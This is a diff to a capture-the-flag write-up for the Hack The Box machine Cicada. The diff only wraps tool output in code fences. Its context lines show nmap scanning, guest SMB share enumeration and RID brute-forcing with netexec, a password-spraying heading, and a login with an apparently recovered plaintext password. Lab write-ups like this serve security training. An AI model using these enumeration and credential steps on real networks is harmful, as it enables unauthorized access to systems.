@@ -21,7 +21,7 @@ Cicada is an Easy-rated Windows Active Directory machine on Hack The Box built a
 ```bash
 nmap -Pn -sC -sV 10.129.231.149
 ```
-
+```bash
 PORT STATE SERVICE VERSION
 53/tcp open domain Simple DNS Plus
 88/tcp open kerberos-sec Microsoft Windows Kerberos
@@ -35,7 +35,7 @@ PORT STATE SERVICE VERSION
 3268/tcp open ldap Microsoft Windows Active Directory LDAP
 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP
 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (WinRM)
-
+```
 
 Certificate CN confirms the DC hostname: `CICADA-DC.cicada.htb`. Port 5985 (WinRM) open is notable for later lateral movement.
 
@@ -46,7 +46,7 @@ netexec smb 10.129.231.149 -u guest -p '' --shares
 ```
 
 Share Permissions Remark
-
+```bash
 ADMIN$ Remote Admin
 C$ Default share
 DEV
@@ -54,7 +54,7 @@ HR READ
 IPC$ READ Remote IPC
 NETLOGON Logon server share
 SYSVOL Logon server share
-
+```
 
 The `HR` share is guest-readable.
 
@@ -79,7 +79,7 @@ nxc smb 10.129.231.149 -u 'guest' -p '' --rid-brute
 ```
 
 Extracted domain users:
-
+```bash
 Administrator
 Guest
 krbtgt
@@ -89,7 +89,7 @@ michael.wrightson
 david.orelious
 Dev
 emily.oscars
-
+```
 
 ### Password Spraying the Default Password
 
@@ -123,12 +123,12 @@ nxc smb 10.129.231.149 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
 ```
 
 Share Permissions Remark
-
+```bash
 DEV READ
 HR READ
 NETLOGON READ
 SYSVOL READ
-
+```
 
 This account can now read the `DEV` share.
 
